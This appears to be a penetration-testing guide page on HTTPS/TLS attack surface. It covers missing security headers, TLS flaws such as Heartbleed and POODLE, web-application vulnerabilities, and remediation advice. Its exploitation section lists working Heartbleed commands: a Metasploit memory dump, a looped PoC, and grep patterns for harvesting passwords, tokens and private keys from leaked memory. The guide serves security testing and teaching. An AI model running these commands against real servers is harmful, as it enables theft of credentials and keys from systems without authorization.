## Overview

::card
---
icon: i-lucide-info
title: What is Port 443?
---
**HTTPS** (HTTP Secure) operates on **TCP port 443**, wrapping standard HTTP inside an **SSL/TLS encryption** layer. It secures web traffic — authentication, banking, APIs, admin panels — across the internet. While encryption protects data in transit, **the web application behind HTTPS carries the same attack surface as HTTP**, plus an entirely new class of vulnerabilities in the **SSL/TLS implementation itself** — weak ciphers, expired certificates, protocol downgrade attacks, and cryptographic flaws that can expose plaintext data or enable man-in-the-middle interception.
::

::callout
---
icon: i-lucide-skull
color: red
---
Port 443 combines **every web application vulnerability from port 80** with an entirely separate attack surface in the **SSL/TLS layer**. Misconfigurations in certificates, cipher suites, and protocol versions can completely undermine the encryption that HTTPS promises.
::

#### Missing Headers Checklist

```text
CRITICAL MISSING HEADERS:
──────────────────────────────────────────────
✗ Strict-Transport-Security (HSTS)
  → Missing = HTTP downgrade possible
  → Recommended: max-age=31536000; includeSubDomains; preload

✗ Content-Security-Policy (CSP)
  → Missing = XSS attacks easier
  → Recommended: script-src 'self'; object-src 'none'

✗ X-Frame-Options
  → Missing = Clickjacking possible
  → Recommended: DENY or SAMEORIGIN

✗ X-Content-Type-Options
  → Missing = MIME sniffing attacks
  → Recommended: nosniff

✗ Referrer-Policy
  → Missing = Referrer information leak
  → Recommended: strict-origin-when-cross-origin

✗ Permissions-Policy
  → Missing = Browser features not restricted
  → Recommended: camera=(), microphone=(), geolocation=()

COOKIE FLAGS:
──────────────────────────────────────────────
✗ Secure flag missing → Cookie sent over HTTP
✗ HttpOnly flag missing → Cookie accessible via JavaScript
✗ SameSite flag missing → CSRF attacks possible
```

### SSL/TLS Vulnerabilities

::card-group
  ::card
  ---
  icon: i-lucide-heart-crack
  title: "Heartbleed (CVE-2014-0160)"
  color: red
  ---
  OpenSSL memory leak via TLS heartbeat extension. Leaks **64KB of server memory per request** — private keys, session tokens, passwords. No authentication needed.
  ::

  ::card
  ---
  icon: i-lucide-dog
  title: "POODLE (CVE-2014-3566)"
  color: red
  ---
  Padding Oracle attack against **SSLv3** (and some TLS implementations). Decrypts HTTPS traffic byte-by-byte. Forces protocol downgrade.
  ::

  ::card
  ---
  icon: i-lucide-arrow-down
  title: "DROWN (CVE-2016-0800)"
  color: red
  ---
  Decrypt TLS sessions using server's **SSLv2** support. Even if SSLv2 is disabled on port 443, **sharing the key** with any SSLv2-enabled service is enough.
  ::

  ::card
  ---
  icon: i-lucide-repeat
  title: "ROBOT Attack"
  color: red
  ---
  **Return Of Bleichenbacher's Oracle Threat.** Exploits RSA key exchange padding to decrypt TLS traffic or forge signatures. Affects F5, Citrix, Cisco, many others.
  ::

  ::card
  ---
  icon: i-lucide-key
  title: "Weak Cipher Suites"
  color: orange
  ---
  **RC4, DES, 3DES, NULL, EXPORT, anonymous** ciphers. Allow brute-force decryption, MITM, or no encryption at all.
  ::

  ::card
  ---
  icon: i-lucide-clock
  title: "Certificate Issues"
  color: orange
  ---
  **Expired, self-signed, wrong hostname, weak signature (SHA-1/MD5), short key length (<2048-bit RSA).** Users trained to click through warnings.
  ::
::

### Web Application Vulnerabilities

::card-group
  ::card
  ---
  icon: i-lucide-syringe
  title: "Injection Attacks"
  color: red
  ---
  **SQLi, XSS, Command Injection, SSTI, XXE, LDAP Injection.** HTTPS encryption does not protect against injection — it happens at the application layer inside the encrypted tunnel.
  ::

  ::card
  ---
  icon: i-lucide-lock-open
  title: "Broken Access Control"
  color: red
  ---
  **IDOR, privilege escalation, forced browsing, JWT manipulation.** HTTPS doesn't enforce authorization — the application must.
  ::

  ::card
  ---
  icon: i-lucide-upload
  title: "File Upload / LFI / RFI"
  color: red
  ---
  **Upload web shells, include local/remote files.** Encryption doesn't block malicious file uploads or path traversal.
  ::

  ::card
  ---
  icon: i-lucide-globe
  title: "SSRF"
  color: red
  ---
  **Force server to make requests** to internal services, cloud metadata (169.254.169.254), or other backend systems.
  ::

  ::card
  ---
  icon: i-lucide-arrow-left-right
  title: "HTTP Downgrade"
  color: orange
  ---
  **SSL stripping** — downgrade HTTPS to HTTP via MITM if HSTS is missing. Tools: `sslstrip`, `bettercap`.
  ::

  ::card
  ---
  icon: i-lucide-file-warning
  title: "Mixed Content"
  color: orange
  ---
  Loading HTTP resources on HTTPS pages. Scripts loaded over HTTP can be **tampered with via MITM** to inject malicious code.
  ::

### Detailed Attack Surface

::field-group
  ::field{name="SSL Stripping / Downgrade" type="High"}
  MITM attack that intercepts the initial HTTP request and prevents the upgrade to HTTPS. Attacker proxies traffic — victim sees HTTP, server sees HTTPS. Defeated by HSTS with preload.
  ::

  ::field{name="Certificate Impersonation" type="High"}
  Self-signed or fraudulent certificates combined with ARP spoofing to intercept HTTPS traffic. Users who click through certificate warnings are compromised.
  ::

  ::field{name="TLS Renegotiation Attack" type="Medium"}
  Insecure TLS renegotiation allows injection of plaintext into encrypted sessions. Prefix injection before authenticated traffic.
  ::

  ::field{name="Session Ticket / Resumption Attacks" type="Medium"}
  Weak session ticket encryption or session ID reuse can allow session hijacking or decryption of recorded traffic.
  ::

  ::field{name="CRIME / BREACH Attacks" type="Medium"}
  Exploit TLS/HTTP compression to extract secrets (cookies, CSRF tokens) from encrypted traffic via side-channel analysis of response sizes.
  ::

  ::field{name="Padding Oracle Attacks" type="High"}
  Exploit CBC mode padding verification to decrypt ciphertext byte by byte. POODLE, Lucky13, various implementations vulnerable.
  ::

  ::field{name="Private Key Compromise" type="Critical"}
  Leaked private keys (via Heartbleed, misconfig, repo exposure) allow decryption of all past and future traffic (unless PFS is used).
  ::

  ::field{name="Forward Secrecy Missing" type="High"}
  Without PFS (ECDHE/DHE), compromising the server's private key allows decrypting **all recorded past sessions**.
  ::

  ::field{name="Subdomain Takeover" type="High"}
  Dangling DNS records pointing to expired cloud resources. Attacker claims the resource and serves content under victim's domain with valid HTTPS.
  ::

  ::field{name="All Port 80 Web Attacks" type="Critical"}
  Every injection, authentication, access control, and application-layer vulnerability applies equally to HTTPS. Encryption protects the transport — not the application logic.
  ::
::

## Exploitation Methodology

### Phase 1 — SSL/TLS Attacks

::tabs
  :::tabs-item{icon="i-lucide-heart-crack" label="Heartbleed Exploitation"}
  ```bash [Terminal]
  # ─── DETECT ───
  nmap -p 443 --script=ssl-heartbleed <TARGET_IP>
  testssl.sh --heartbleed https://<TARGET_IP>

  # ─── EXPLOIT (Metasploit) ───
  msfconsole -q
  use auxiliary/scanner/ssl/openssl_heartbleed
  set RHOSTS <TARGET_IP>
  set RPORT 443
  set action DUMP
  set VERBOSE true
  run

  # ─── EXPLOIT (Python) ───
  # Heartbleed PoC
  python2 heartbleed.py <TARGET_IP> -p 443 | tee bleed_output.txt

  # Extract in loop for maximum data
  for i in $(seq 1 500); do
    python2 heartbleed.py <TARGET_IP> -p 443 >> bleed_all.bin 2>/dev/null
    echo "Iteration $i"
  done

  # ─── EXTRACT CREDENTIALS ───
  strings bleed_all.bin | sort -u > bleed_strings.txt
  
  # Search for juicy data
  grep -iE "password|passwd|pwd" bleed_strings.txt
  grep -iE "cookie|session|token|jwt" bleed_strings.txt
  grep -iE "authorization|bearer|basic" bleed_strings.txt
  grep -iE "BEGIN.*KEY" bleed_strings.txt
  grep -iE "user(name)?=" bleed_strings.txt
  grep -iE "api.key|secret" bleed_strings.txt

  # ─── EXTRACT PRIVATE KEY ───
  # If RSA private key leaked, use it to decrypt captured traffic
  # 1. Capture traffic with tcpdump
  tcpdump -i eth0 -w capture.pcap host <TARGET_IP> and port 443
  # 2. In Wireshark: Edit → Preferences → Protocols → TLS
  #    → Add RSA key file
  # 3. Decrypt all traffic
  ```

## Defense & Remediation

::tip
Provide these **remediation recommendations** in your pentest report for HTTPS/SSL/TLS findings.
::

::card-group
  ::card
  ---
  icon: i-lucide-shield-check
  title: "TLS 1.2+ Only"
  color: green
  ---
  Disable **SSLv2, SSLv3, TLSv1.0, TLSv1.1**. Only allow TLS 1.2 and TLS 1.3. Prefer TLS 1.3 where possible.
  ::

  ::card
  ---
  icon: i-lucide-lock
  title: "Strong Cipher Suites"
  color: green
  ---
  Disable **NULL, EXPORT, RC4, DES, 3DES, anonymous** ciphers. Use **AEAD ciphers** (AES-GCM, ChaCha20-Poly1305). Enforce **forward secrecy** (ECDHE).
  ::

  ::card
  ---
  icon: i-lucide-file-check
  title: "Valid Certificates"
  color: green
  ---
  Use certificates from **trusted CAs**. Ensure **correct hostname**, **not expired**, **SHA-256+ signature**, **2048-bit+ RSA** or **256-bit+ ECDSA** keys.
  ::

  ::card
  ---
  icon: i-lucide-arrow-right
  title: "HSTS with Preload"
  color: green
  ---
  Implement `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` and submit to the **HSTS preload list**.
  ::

  ::card
  ---
  icon: i-lucide-key-round
  title: "Certificate Pinning"
  color: green
  ---
  For high-security applications, implement **HPKP** (deprecated but concept valid) or **certificate pinning** in mobile apps.
  ::

  ::card
  ---
  icon: i-lucide-scan-eye
  title: "CT Monitoring"
  color: green
  ---
  Monitor **Certificate Transparency** logs for unauthorized certificates issued for your domains. Use tools like **certspotter** or **Facebook CT Monitor**.
  ::
::

::card-group
  ::card
  ---
  icon: i-lucide-shield
  title: "Security Headers"
  color: green
  ---
  Implement **CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy**. Set cookie flags: **Secure, HttpOnly, SameSite**.
  ::

  ::card
  ---
  icon: i-lucide-refresh-cw
  title: "Patch & Update"
  color: green
  ---
  Keep **OpenSSL, web servers, frameworks, and CMS** updated. Subscribe to security advisories. Automate where possible.
  ::

  ::card
  ---
  icon: i-lucide-key
  title: "Key Management"
  color: green
  ---
  **Never expose private keys** in repos, backups, or error messages. Use **HSMs** for critical keys. Rotate keys after suspected compromise.
  ::

  ::card
  ---
  icon: i-lucide-eye
  title: "Regular Audits"
  color: green
  ---
  Schedule regular **SSL/TLS audits** using testssl.sh, sslyze, or Qualys SSL Labs. Target **A+ rating** on SSL Labs.
  ::
::
